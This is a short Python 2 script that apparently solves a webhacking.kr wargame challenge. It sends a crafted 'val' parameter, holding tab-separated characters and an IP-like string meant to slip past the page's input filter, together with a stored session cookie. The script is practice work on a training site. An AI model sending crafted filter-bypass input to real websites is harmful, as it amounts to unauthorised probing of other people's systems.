#-*- coding: utf-8 -*-
import urllib2
import CookieConstants
import urllib

challengeUrl = "http://webhacking.kr/challenge/codeing/code2.html"
param = urllib.quote("1abcde_.A163.152.126.173.A\tp\ta\ts\ts")

httpRequest = urllib2.Request(challengeUrl + "?val=" + param)
httpRequest.add_header("Cookie", CookieConstants.sessionId)

httpResponse = urllib2.urlopen(httpRequest).read()
print httpResponse
